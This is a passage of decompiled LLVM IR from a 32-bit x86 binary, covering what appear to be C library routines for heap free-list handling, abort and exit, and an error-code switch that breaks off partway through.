dec_label_pc_80514eb:                             ; preds = %dec_label_pc_80514b2, %dec_label_pc_80514e3
  %v1_80514fe = phi i32 [ %v2_80514b5, %dec_label_pc_80514b2 ], [ %v0_80514f2.pre, %dec_label_pc_80514e3 ]
  %v1_80514ef = and i32 %v3_80514bd, -4
  store i32 %v1_80514ef, i32* @ebp, align 4
  %v1_80514f2 = load i32, i32* @global_var_805336c.33, align 4
  %v12_80514f2 = icmp eq i32 %v1_80514fe, %v1_80514f2
  br i1 %v12_80514f2, label %dec_label_pc_805154c, label %dec_label_pc_80514fa

dec_label_pc_80514fa:                             ; preds = %dec_label_pc_80514eb
  %v2_80514fa = add i32 %v1_80514fe, 4
  %v3_80514fa = add i32 %v2_80514fa, %v1_80514ef
  %v4_80514fa = inttoptr i32 %v3_80514fa to i32*
  %v5_80514fa = load i32, i32* %v4_80514fa, align 4
  store i32 %v5_80514fa, i32* %eax.global-to-local, align 4
  %v3_80514fe = inttoptr i32 %v2_80514fa to i32*
  store i32 %v1_80514ef, i32* %v3_80514fe, align 4
  %v0_8051501 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051501 = urem i32 %v0_8051501, 2
  %v2_8051501 = icmp eq i32 %v1_8051501, 0
  store i32 %v1_8051501, i32* %eax.global-to-local, align 4
  %v1_8051506 = icmp eq i1 %v2_8051501, false
  br i1 %v1_8051506, label %dec_label_pc_8051527, label %dec_label_pc_8051508

dec_label_pc_8051508:                             ; preds = %dec_label_pc_80514fa
  %v0_8051508 = load i32, i32* @esi, align 4
  %v1_8051508 = add i32 %v0_8051508, 8
  %v2_8051508 = inttoptr i32 %v1_8051508 to i32*
  %v3_8051508 = load i32, i32* %v2_8051508, align 4
  store i32 %v3_8051508, i32* @edx, align 4
  %v1_805150b = add i32 %v0_8051508, 12
  %v2_805150b = inttoptr i32 %v1_805150b to i32*
  %v3_805150b = load i32, i32* %v2_805150b, align 4
  store i32 %v3_805150b, i32* %eax.global-to-local, align 4
  %v1_805150e = add i32 %v3_8051508, 12
  %v2_805150e = inttoptr i32 %v1_805150e to i32*
  %v3_805150e = load i32, i32* %v2_805150e, align 4
  store i32 %v3_805150e, i32* @edi, align 4
  %v12_8051511 = icmp eq i32 %v3_805150e, %v0_8051508
  %v1_8051513 = icmp eq i1 %v12_8051511, false
  br i1 %v1_8051513, label %dec_label_pc_805151a, label %dec_label_pc_8051515

dec_label_pc_8051515:                             ; preds = %dec_label_pc_8051508
  %v1_8051515 = add i32 %v3_805150b, 8
  %v2_8051515 = inttoptr i32 %v1_8051515 to i32*
  %v3_8051515 = load i32, i32* %v2_8051515, align 4
  %v15_8051515 = icmp eq i32 %v3_8051515, %v3_805150e
  br i1 %v15_8051515, label %dec_label_pc_805151f, label %dec_label_pc_805151a

dec_label_pc_805151a:                             ; preds = %dec_label_pc_8051515, %dec_label_pc_8051508, %dec_label_pc_80514de, %dec_label_pc_80514ca
  %v0_805151a = call i32 @function_80515da()
  store i32 %v0_805151a, i32* %eax.global-to-local, align 4
  %v1_805151f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805151f

dec_label_pc_805151f:                             ; preds = %dec_label_pc_8051515, %dec_label_pc_805151a
  %v1_805151f = phi i32 [ %v3_8051508, %dec_label_pc_8051515 ], [ %v1_805151f.pre, %dec_label_pc_805151a ]
  %v0_805151f = phi i32 [ %v3_805150b, %dec_label_pc_8051515 ], [ %v0_805151a, %dec_label_pc_805151a ]
  %v2_805151f = add i32 %v1_805151f, 12
  %v3_805151f = inttoptr i32 %v2_805151f to i32*
  store i32 %v0_805151f, i32* %v3_805151f, align 4
  %v0_8051522 = load i32, i32* @edx, align 4
  %v1_8051522 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051522 = add i32 %v1_8051522, 8
  %v3_8051522 = inttoptr i32 %v2_8051522 to i32*
  store i32 %v0_8051522, i32* %v3_8051522, align 4
  %v0_8051525 = load i32, i32* @ebx, align 4
  %v1_8051525 = load i32, i32* @ebp, align 4
  %v2_8051525 = add i32 %v1_8051525, %v0_8051525
  store i32 %v2_8051525, i32* @ebx, align 4
  br label %dec_label_pc_8051527

dec_label_pc_8051527:                             ; preds = %dec_label_pc_80514fa, %dec_label_pc_805151f
  %v0_8051527 = load i32, i32* @global_var_805337c.51, align 4
  store i32 %v0_8051527, i32* %eax.global-to-local, align 4
  %v0_805152c = load i32, i32* @ecx, align 4
  %v1_805152c = add i32 %v0_805152c, 12
  %v2_805152c = inttoptr i32 %v1_805152c to i32*
  store i32 ptrtoint (i32* @global_var_8053374.35 to i32), i32* %v2_805152c, align 4
  %v0_8051533 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051533 = load i32, i32* @ecx, align 4
  %v2_8051533 = add i32 %v1_8051533, 8
  %v3_8051533 = inttoptr i32 %v2_8051533 to i32*
  store i32 %v0_8051533, i32* %v3_8051533, align 4
  %v0_8051536 = load i32, i32* @ebx, align 4
  %v1_8051536 = load i32, i32* @ecx, align 4
  %v3_8051536 = add i32 %v1_8051536, %v0_8051536
  %v4_8051536 = inttoptr i32 %v3_8051536 to i32*
  store i32 %v0_8051536, i32* %v4_8051536, align 4
  %v0_8051539 = load i32, i32* @ecx, align 4
  %v1_8051539 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051539 = add i32 %v1_8051539, 12
  %v3_8051539 = inttoptr i32 %v2_8051539 to i32*
  store i32 %v0_8051539, i32* %v3_8051539, align 4
  %v0_805153c = load i32, i32* @ebx, align 4
  %v1_805153e = or i32 %v0_805153c, 1
  store i32 %v1_805153e, i32* %eax.global-to-local, align 4
  %v0_8051541 = load i32, i32* @ecx, align 4
  store i32 %v0_8051541, i32* @global_var_805337c.51, align 4
  %v2_8051547 = add i32 %v0_8051541, 4
  %v3_8051547 = inttoptr i32 %v2_8051547 to i32*
  store i32 %v1_805153e, i32* %v3_8051547, align 4
  br label %dec_label_pc_805155c

dec_label_pc_805154c:                             ; preds = %dec_label_pc_80514eb
  %v0_805154c = load i32, i32* @ebx, align 4
  %v2_805154c = add i32 %v0_805154c, %v1_80514ef
  store i32 %v2_805154c, i32* @ebx, align 4
  %v1_8051550 = or i32 %v2_805154c, 1
  store i32 %v1_8051550, i32* %eax.global-to-local, align 4
  %v1_8051553 = load i32, i32* @ecx, align 4
  %v2_8051553 = add i32 %v1_8051553, 4
  %v3_8051553 = inttoptr i32 %v2_8051553 to i32*
  store i32 %v1_8051550, i32* %v3_8051553, align 4
  %v0_8051556 = load i32, i32* @ecx, align 4
  store i32 %v0_8051556, i32* @global_var_805336c.33, align 4
  br label %dec_label_pc_805155c

dec_label_pc_805155c:                             ; preds = %dec_label_pc_8051527, %dec_label_pc_805154c
  %v0_805155c = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_805155c, 131072
  br i1 %tmp21, label %dec_label_pc_80515c1, label %dec_label_pc_8051564

dec_label_pc_8051564:                             ; preds = %dec_label_pc_805155c
  %v0_8051564 = load i8, i8* @global_var_8053340.32, align 64
  %v1_8051564 = and i8 %v0_8051564, 2
  %v2_8051564 = icmp eq i8 %v1_8051564, 0
  br i1 %v2_8051564, label %dec_label_pc_805157d, label %dec_label_pc_805156d

dec_label_pc_805156d:                             ; preds = %dec_label_pc_8051564
  %v2_8051575 = call i32 @function_8051296(i32* bitcast (i8* @global_var_8053340.32 to i32*))
  store i32 %v2_8051575, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805157d

dec_label_pc_805157d:                             ; preds = %dec_label_pc_8051564, %dec_label_pc_805156d
  %v0_805157d = load i32, i32* @global_var_805336c.33, align 4
  store i32 %v0_805157d, i32* %eax.global-to-local, align 4
  %v1_8051582 = add i32 %v0_805157d, 4
  %v2_8051582 = inttoptr i32 %v1_8051582 to i32*
  %v3_8051582 = load i32, i32* %v2_8051582, align 4
  %v1_8051585 = and i32 %v3_8051582, -4
  store i32 %v1_8051585, i32* %eax.global-to-local, align 4
  %v1_8051588 = load i32, i32* @global_var_8053684.49, align 4
  %v7_8051588 = icmp ult i32 %v1_8051585, %v1_8051588
  br i1 %v7_8051588, label %dec_label_pc_80515c1, label %dec_label_pc_8051590

dec_label_pc_8051590:                             ; preds = %dec_label_pc_805157d
  store i32 ptrtoint (i8* @global_var_8053340.32 to i32), i32* @edx, align 4
  %v0_8051595 = load i32, i32* @global_var_8053688.47, align 8
  store i32 %v0_8051595, i32* @eax, align 4
  %v0_805159a = call i32 @function_8051209()
  store i32 %v0_805159a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80515c1

dec_label_pc_80515a1:                             ; preds = %dec_label_pc_80514a9
  %v2_80515a1 = inttoptr i32 %v1_8051472 to i32*
  %v3_80515a1 = load i32, i32* %v2_80515a1, align 4
  %v0_80515a4 = load i32, i32* @global_var_8053690.40, align 16
  %v1_80515a4 = add i32 %v0_80515a4, -1
  store i32 %v1_80515a4, i32* @global_var_8053690.40, align 16
  %v2_80515aa = add i32 %v3_80515a1, %v1_8051482
  store i32 %v2_80515aa, i32* %eax.global-to-local, align 4
  %v2_80515ad = sub i32 %v1_8051472, %v3_80515a1
  %v0_80515b3 = load i32, i32* @global_var_80536a4.43, align 4
  %v2_80515b3 = sub i32 %v0_80515b3, %v2_80515aa
  store i32 %v2_80515b3, i32* @global_var_80536a4.43, align 4
  %v4_80515b9 = inttoptr i32 %v2_80515ad to i32*
  %v5_80515b9 = call i32 @function_8052309(i32* %v4_80515b9, i32 %v2_80515aa, i32 %v1_8051482, i32 %v1_8051482)
  store i32 %v5_80515b9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80515c1

dec_label_pc_80515c1:                             ; preds = %dec_label_pc_805157d, %dec_label_pc_805155c, %dec_label_pc_8051590, %dec_label_pc_8051489, %dec_label_pc_80515a1
  store i32 %v2_805145c, i32* @eax, align 4
  %v2_80515ca = call i32 @function_8051ba5(i32 %v2_805145c, i32 1)
  store i32 %v2_80515ca, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80515d2

dec_label_pc_80515d2:                             ; preds = %dec_label_pc_805143e, %dec_label_pc_80515c1
  %.0 = phi i32 [ undef, %dec_label_pc_805143e ], [ %v2_80515ca, %dec_label_pc_80515c1 ]
  store i32 %v0_8051441, i32* @ebx, align 4
  store i32 %v0_8051440, i32* @esi, align 4
  store i32 %v0_805143f, i32* @edi, align 4
  store i32 %v0_805143e, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_80515a1, { 1, 0 }
  uselistorder i32 %v0_8051536, { 1, 0 }
  uselistorder i32 %v1_8051501, { 1, 0 }
  uselistorder i32 %v2_80514fa, { 1, 0 }
  uselistorder i32 %v1_80514ef, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80514fe, { 1, 0 }
  uselistorder i32 %v1_8051482, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_805147d, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8051472, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 (i32*)* @function_8051296, { 3, 0, 1, 2 }
  uselistorder i32* bitcast (i8* @global_var_8053340.32 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8053374.35 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_805336c.33, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i8* @global_var_8053340.32 to i32), { 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8053340.32, { 4, 7, 6, 5, 3, 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805303c.31 to i32), { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_80515d2, { 1, 0 }
  uselistorder label %dec_label_pc_80515c1, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_805157d, { 1, 0 }
  uselistorder label %dec_label_pc_805155c, { 1, 0 }
  uselistorder label %dec_label_pc_8051527, { 1, 0 }
  uselistorder label %dec_label_pc_805151f, { 1, 0 }
  uselistorder label %dec_label_pc_80514eb, { 1, 0 }
}

define i32 @function_80515da() local_unnamed_addr {
dec_label_pc_80515f5.lr.ph:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_80515e6 = call i32 @function_8051ba2(i32 ptrtoint (i32* @global_var_8053054.52 to i32))
  %v12_80515f0 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_80515f548 = add i32 %v12_80515f0, 276
  %v5_80515f549 = inttoptr i32 %v4_80515f548 to i32*
  store i32 0, i32* %v5_80515f549, align 4
  %v0_805160050 = load i32, i32* %eax.global-to-local, align 4
  %v1_805160051 = add i32 %v0_805160050, -1
  %v9_805160052 = icmp slt i32 %v1_805160051, 0
  store i32 %v1_805160051, i32* %eax.global-to-local, align 4
  %v1_805160153 = icmp eq i1 %v9_805160052, false
  br i1 %v1_805160153, label %dec_label_pc_80515f5.dec_label_pc_80515f5_crit_edge, label %dec_label_pc_8051603

dec_label_pc_80515f5.dec_label_pc_80515f5_crit_edge: ; preds = %dec_label_pc_80515f5.lr.ph, %dec_label_pc_80515f5.dec_label_pc_80515f5_crit_edge
  %v1_805160054 = phi i32 [ %v1_8051600, %dec_label_pc_80515f5.dec_label_pc_80515f5_crit_edge ], [ %v1_805160051, %dec_label_pc_80515f5.lr.ph ]
  %v0_80515f5.pre = load i32, i32* @esp, align 4
  %v2_80515f5 = mul i32 %v1_805160054, 4
  %v3_80515f5 = add i32 %v0_80515f5.pre, 152
  %v4_80515f5 = add i32 %v3_80515f5, %v2_80515f5
  %v5_80515f5 = inttoptr i32 %v4_80515f5 to i32*
  store i32 0, i32* %v5_80515f5, align 4
  %v0_8051600 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051600 = add i32 %v0_8051600, -1
  %v9_8051600 = icmp slt i32 %v1_8051600, 0
  store i32 %v1_8051600, i32* %eax.global-to-local, align 4
  %v1_8051601 = icmp eq i1 %v9_8051600, false
  br i1 %v1_8051601, label %dec_label_pc_80515f5.dec_label_pc_80515f5_crit_edge, label %dec_label_pc_8051603

dec_label_pc_8051603:                             ; preds = %dec_label_pc_80515f5.dec_label_pc_80515f5_crit_edge, %dec_label_pc_80515f5.lr.ph
  %v0_8051603 = load i32, i32* @ebx, align 4
  %v2_8051607 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8051607, i32* @ebx, align 4
  %v4_805160f = call i32 @function_8050633(i32 %v2_8051607, i32 6, i32 %v0_8051603, i32 %v0_8051603)
  store i32 %v4_805160f, i32* %eax.global-to-local, align 4
  %v1_8051617 = icmp eq i32 %v4_805160f, 0
  %v1_8051619 = icmp eq i1 %v1_8051617, false
  br i1 %v1_8051619, label %dec_label_pc_8051629, label %dec_label_pc_805161b

dec_label_pc_805161b:                             ; preds = %dec_label_pc_8051603
  %v3_8051621 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8051621 = call i32 @function_804ff4f(i32 1, %_TYPEDEF_sigset_t* %v3_8051621, i32 0)
  store i32 %v4_8051621, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051629

dec_label_pc_8051629:                             ; preds = %dec_label_pc_8051603, %dec_label_pc_805161b
  %v2_805166123 = phi i32 [ %v4_805160f, %dec_label_pc_8051603 ], [ %v4_8051621, %dec_label_pc_805161b ]
  %v0_8051629 = load i8, i8* @global_var_8053134.53, align 4
  %v1_8051629 = icmp eq i8 %v0_8051629, 0
  %v1_8051630 = icmp eq i1 %v1_8051629, false
  br i1 %v1_8051630, label %dec_label_pc_8051661, label %dec_label_pc_8051632

dec_label_pc_8051632:                             ; preds = %dec_label_pc_8051629
  store i8 1, i8* @global_var_8053134.53, align 4
  br label %dec_label_pc_8051639

dec_label_pc_8051639:                             ; preds = %dec_label_pc_80516a0, %dec_label_pc_8051632
  %v1_8051641 = call i32 @function_8051ba2(i32 ptrtoint (i32* @global_var_8053054.52 to i32))
  store i32 %v1_8051641, i32* %eax.global-to-local, align 4
  %v1_805164d = call i32 @function_8052521(i32 6)
  store i32 %v1_805164d, i32* %eax.global-to-local, align 4
  %v1_8051659 = call i32 @function_8051ba2(i32 ptrtoint (i32* @global_var_8053054.52 to i32))
  store i32 %v1_8051659, i32* %eax.global-to-local, align 4
  %v0_8051661.pre = load i8, i8* @global_var_8053134.53, align 4
  br label %dec_label_pc_8051661

dec_label_pc_8051661:                             ; preds = %dec_label_pc_8051629, %dec_label_pc_8051639
  %v2_8051661 = phi i32 [ %v2_805166123, %dec_label_pc_8051629 ], [ %v1_8051659, %dec_label_pc_8051639 ]
  %v0_8051661 = phi i8 [ %v0_8051629, %dec_label_pc_8051629 ], [ %v0_8051661.pre, %dec_label_pc_8051639 ]
  %v1_8051661 = zext i8 %v0_8051661 to i32
  %v3_8051661 = and i32 %v2_8051661, -256
  %v4_8051661 = or i32 %v1_8051661, %v3_8051661
  store i32 %v4_8051661, i32* %eax.global-to-local, align 4
  %v10_8051666 = icmp eq i8 %v0_8051661, 1
  %v1_8051668 = icmp eq i1 %v10_8051666, false
  br i1 %v1_8051668, label %dec_label_pc_80516c2, label %dec_label_pc_8051695.lr.ph

dec_label_pc_8051695.lr.ph:                       ; preds = %dec_label_pc_8051661
  store i8 2, i8* @global_var_8053134.53, align 4
  %v2_8051679 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8051679, i32* %eax.global-to-local, align 4
  %v3_805167e = bitcast i32* %stack_var_-272 to i8*
  %v4_805167e = call i32 @function_805026c(i8* %v3_805167e, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805169540 = add i32 %v12_80515f0, 140
  %v5_805169541 = inttoptr i32 %v4_805169540 to i32*
  store i32 -1, i32* %v5_805169541, align 4
  %v0_805169d42 = load i32, i32* %eax.global-to-local, align 4
  %v1_805169d43 = add i32 %v0_805169d42, -1
  %v9_805169d44 = icmp slt i32 %v1_805169d43, 0
  store i32 %v1_805169d43, i32* %eax.global-to-local, align 4
  %v1_805169e45 = icmp eq i1 %v9_805169d44, false
  br i1 %v1_805169e45, label %dec_label_pc_8051695.dec_label_pc_8051695_crit_edge, label %dec_label_pc_80516a0

dec_label_pc_8051695.dec_label_pc_8051695_crit_edge: ; preds = %dec_label_pc_8051695.lr.ph, %dec_label_pc_8051695.dec_label_pc_8051695_crit_edge
  %v1_805169d46 = phi i32 [ %v1_805169d, %dec_label_pc_8051695.dec_label_pc_8051695_crit_edge ], [ %v1_805169d43, %dec_label_pc_8051695.lr.ph ]
  %v0_8051695.pre = load i32, i32* @esp, align 4
  %v2_8051695 = mul i32 %v1_805169d46, 4
  %v3_8051695 = add i32 %v0_8051695.pre, 16
  %v4_8051695 = add i32 %v3_8051695, %v2_8051695
  %v5_8051695 = inttoptr i32 %v4_8051695 to i32*
  store i32 -1, i32* %v5_8051695, align 4
  %v0_805169d = load i32, i32* %eax.global-to-local, align 4
  %v1_805169d = add i32 %v0_805169d, -1
  %v9_805169d = icmp slt i32 %v1_805169d, 0
  store i32 %v1_805169d, i32* %eax.global-to-local, align 4
  %v1_805169e = icmp eq i1 %v9_805169d, false
  br i1 %v1_805169e, label %dec_label_pc_8051695.dec_label_pc_8051695_crit_edge, label %dec_label_pc_80516a0

dec_label_pc_80516a0:                             ; preds = %dec_label_pc_8051695.dec_label_pc_8051695_crit_edge, %dec_label_pc_8051695.lr.ph
  store i32 %v2_8051679, i32* %eax.global-to-local, align 4
  %v4_80516b5 = call i32 @function_8051de3(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_80516b5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051639

dec_label_pc_80516c2:                             ; preds = %dec_label_pc_8051661
  %v10_80516c2 = icmp eq i8 %v0_8051661, 2
  %v1_80516c4 = icmp eq i1 %v10_80516c2, false
  br i1 %v1_80516c4, label %dec_label_pc_80516ce, label %dec_label_pc_80516ce.thread

dec_label_pc_80516ce.thread:                      ; preds = %dec_label_pc_80516c2
  store i8 3, i8* @global_var_8053134.53, align 4
  br label %dec_label_pc_80516d7

dec_label_pc_80516ce:                             ; preds = %dec_label_pc_80516c2
  %v9_80516ce = icmp eq i8 %v0_8051661, 3
  %v1_80516d5 = icmp eq i1 %v9_80516ce, false
  br i1 %v1_80516d5, label %dec_label_pc_80516e8, label %dec_label_pc_80516d7

dec_label_pc_80516d7:                             ; preds = %dec_label_pc_80516ce.thread, %dec_label_pc_80516ce
  store i8 4, i8* @global_var_8053134.53, align 4
  %v1_80516e3 = call i32 @function_8051f44(i32 127)
  unreachable

dec_label_pc_80516e8:                             ; preds = %dec_label_pc_80516ce, %dec_label_pc_80516e8
  br label %dec_label_pc_80516e8

; uselistorder directives
  uselistorder i32 %v1_805169d, { 2, 1, 0 }
  uselistorder i32 %v1_8051600, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 9, 8, 0, 2, 3, 10, 11, 12, 13, 14, 15, 16, 18, 17, 1, 4, 5 }
  uselistorder i8 3, { 3, 4, 0, 1, 2 }
  uselistorder i32 (i32, i32*, i32)* @function_8051de3, { 1, 0 }
  uselistorder i8 2, { 8, 14, 11, 1, 12, 2, 3, 4, 5, 6, 9, 10, 7, 0, 13 }
  uselistorder i8* @global_var_8053134.53, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_80516e8, { 1, 0 }
  uselistorder label %dec_label_pc_80516d7, { 1, 0 }
  uselistorder label %dec_label_pc_8051695.dec_label_pc_8051695_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8051661, { 1, 0 }
  uselistorder label %dec_label_pc_8051629, { 1, 0 }
  uselistorder label %dec_label_pc_80515f5.dec_label_pc_80515f5_crit_edge, { 1, 0 }
}

define i32 @function_805182e(i32 %arg1) local_unnamed_addr {
dec_label_pc_805182e:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8051841 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051841, i32* @ebx, align 4
  %v2_8051846 = call i32 @function_8051ba5(i32 %v2_8051841, i32 134552482)
  %v1_8051852 = call i32 @function_8051ba2(i32 ptrtoint (i32* @global_var_805306c.54 to i32))
  %v0_8051857 = load i32, i32* @global_var_8053138.55, align 8
  store i32 %v0_8051857, i32* @eax, align 4
  %v1_805185f = icmp eq i32 %v0_8051857, 0
  br i1 %v1_805185f, label %dec_label_pc_805186c, label %dec_label_pc_8051863

dec_label_pc_8051863:                             ; preds = %dec_label_pc_805182e
  %v0_8051866 = load i32, i32* @esi, align 4
  %v1_8051867 = call i32 @unknown_0(i32 %v0_8051866)
  store i32 %v1_8051867, i32* @eax, align 4
  br label %dec_label_pc_805186c

dec_label_pc_805186c:                             ; preds = %dec_label_pc_805182e, %dec_label_pc_8051863
  %v2_8051871 = call i32 @function_8051ba5(i32 %v2_8051841, i32 1)
  %v0_8051876 = call i32 @function_8051b63()
  %v0_805188f = load i32, i32* @esi, align 4
  %v1_8051890 = call i32 @function_8051f44(i32 %v0_805188f)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_8051f44, { 1, 0 }
  uselistorder i32 (i32)* @function_8051ba2, { 3, 2, 1, 0, 5, 10, 8, 7, 9, 6, 4 }
  uselistorder i32 (i32, i32)* @function_8051ba5, { 1, 0, 5, 4, 13, 12, 9, 8, 7, 6, 11, 10, 3, 2 }
  uselistorder label %dec_label_pc_805186c, { 1, 0 }
}

define i32 @function_8051a1e(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051a1e:
  switch i32 %arg1, label %dec_label_pc_8051a3d [
    i32 0, label %dec_label_pc_8051a4d
    i32 1, label %dec_label_pc_8051b32
    i32 2, label %dec_label_pc_8051a57
    i32 3, label %dec_label_pc_8051a61
    i32 4, label %dec_label_pc_8051a6b
    i32 5, label %dec_label_pc_8051b01
    i32 6, label %dec_label_pc_8051a73
    i32 7, label %dec_label_pc_8051a33
    i32 8, label %dec_label_pc_8051a33
    i32 9, label %dec_label_pc_8051a33
    i32 10, label %dec_label_pc_8051a33
    i32 11, label %dec_label_pc_8051a33
    i32 12, label %dec_label_pc_8051a33
    i32 13, label %dec_label_pc_8051a33
    i32 14, label %dec_label_pc_8051a33
    i32 15, label %dec_label_pc_8051a33
    i32 16, label %dec_label_pc_8051a33
    i32 17, label %dec_label_pc_8051a33
    i32 18, label %dec_label_pc_8051a33
    i32 19, label %dec_label_pc_8051a33
    i32 20, label %dec_label_pc_8051a33
    i32 21, label %dec_label_pc_8051a33
    i32 22, label %dec_label_pc_8051a33
    i32 23, label %dec_label_pc_8051b32
    i32 24, label %dec_label_pc_8051b32
    i32 25, label %dec_label_pc_8051b3e
    i32 26, label %dec_label_pc_8051b0f
    i32 27, label %dec_label_pc_8051b32
    i32 28, label %dec_label_pc_8051a85
    i32 29, label %dec_label_pc_8051b08
    i32 30, label %dec_label_pc_8051a7d
    i32 31, label %dec_label_pc_8051b1d
    i32 32, label %dec_label_pc_8051b32
    i32 33, label %dec_label_pc_8051b32
    i32 34, label %dec_label_pc_8051b32
    i32 35, label %dec_label_pc_8051b16
    i32 36, label %dec_label_pc_8051b45
    i32 37, label %dec_label_pc_8051b4c
    i32 38, label %dec_label_pc_8051b45
    i32 39, label %dec_label_pc_8051a8f
    i32 40, label %dec_label_pc_8051b53
    i32 41, label %dec_label_pc_8051b32
    i32 42, label %dec_label_pc_8051b1d
    i32 43, label %dec_label_pc_8051b4c
    i32 44, label %dec_label_pc_8051b5a
    i32 45, label %dec_label_pc_8051b4c
    i32 46, label %dec_label_pc_8051b08
    i32 47, label %dec_label_pc_8051b08
    i32 48, label %dec_label_pc_8051b08
    i32 49, label %dec_label_pc_8051b32
    i32 50, label %dec_label_pc_8051b32
    i32 51, label %dec_label_pc_8051b08
    i32 52, label %dec_label_pc_8051b08
    i32 53, label %dec_label_pc_8051b32
    i32 54, label %dec_label_pc_8051b32
    i32 55, label %dec_label_pc_8051b32
    i32 56, label %dec_label_pc_8051b32
    i32 57, label %dec_label_pc_8051b32
    i32 58, label %dec_label_pc_8051b32
    i32 59, label %dec_label_pc_8051b32
    i32 60, label %dec_label_pc_8051b32
    i32 61, label %dec_label_pc_8051b32
    i32 62, label %dec_label_pc_8051b32
    i32 63, label %dec_label_pc_8051b32
    i32 64, label %dec_label_pc_8051b32
    i32 65, label %dec_label_pc_8051b32
    i32 66, label %dec_label_pc_8051b32
    i32 67, label %dec_label_pc_8051a33
    i32 68, label %dec_label_pc_8051a33
    i32 69, label %dec_label_pc_8051b16
    i32 70, label %dec_label_pc_8051b16
    i32 71, label %dec_label_pc_8051b16
    i32 72, label %dec_label_pc_8051b1d
    i32 73, label %dec_label_pc_8051b24
    i32 74, label %dec_label_pc_8051b2b
    i32 75, label %dec_label_pc_8051a99
    i32 76, label %dec_label_pc_8051b2b
    i32 77, label %dec_label_pc_8051a33
    i32 78, label %dec_label_pc_8051a33
    i32 79, label %dec_label_pc_8051a33
    i32 80, label %dec_label_pc_8051a33
    i32 81, label %dec_label_pc_8051a33
    i32 82, label %dec_label_pc_8051a33
    i32 83, label %dec_label_pc_8051a33
    i32 84, label %dec_label_pc_8051a33
    i32 85, label %dec_label_pc_8051b32
    i32 86, label %dec_label_pc_8051b32
    i32 87, label %dec_label_pc_8051b0f
    i32 88, label %dec_label_pc_8051aa3
    i32 89, label %dec_label_pc_8051aad
    i32 90, label %dec_label_pc_8051b24
    i32 91, label %dec_label_pc_8051a33
    i32 92, label %dec_label_pc_8051a33
    i32 93, label %dec_label_pc_8051a33
    i32 94, label %dec_label_pc_8051a33
    i32 95, label %dec_label_pc_8051b08
    i32 96, label %dec_label_pc_8051b32
    i32 97, label %dec_label_pc_8051b32
    i32 98, label %dec_label_pc_8051a33
    i32 99, label %dec_label_pc_8051a33
    i32 100, label %dec_label_pc_8051a33
    i32 101, label %dec_label_pc_8051ab7
    i32 102, label %dec_label_pc_8051afa
    i32 103, label %dec_label_pc_8051b37
    i32 104, label %dec_label_pc_8051b0f
    i32 105, label %dec_label_pc_8051ac1
    i32 106, label %dec_label_pc_8051b1d
    i32 107, label %dec_label_pc_8051b1d
    i32 108, label %dec_label_pc_8051b01
    i32 109, label %dec_label_pc_8051b3e
    i32 110, label %dec_label_pc_8051b5a
    i32 111, label %dec_label_pc_8051afa
    i32 112, label %dec_label_pc_8051b37
    i32 113, label %dec_label_pc_8051b5a
    i32 114, label %dec_label_pc_8051acb
    i32 115, label %dec_label_pc_8051b53
    i32 116, label %dec_label_pc_8051b32
    i32 117, label %dec_label_pc_8051b32
    i32 118, label %dec_label_pc_8051ad5
    i32 119, label %dec_label_pc_8051adf
    i32 120, label %dec_label_pc_8051b4c
    i32 121, label %dec_label_pc_8051b0f
    i32 122, label %dec_label_pc_8051b0f
    i32 123, label %dec_label_pc_8051b0f
    i32 124, label %dec_label_pc_8051b0f
    i32 125, label %dec_label_pc_8051a33
    i32 126, label %dec_label_pc_8051a33
    i32 127, label %dec_label_pc_8051b32
    i32 128, label %dec_label_pc_8051b32
    i32 129, label %dec_label_pc_8051a33
    i32 130, label %dec_label_pc_8051a33
    i32 131, label %dec_label_pc_8051b32
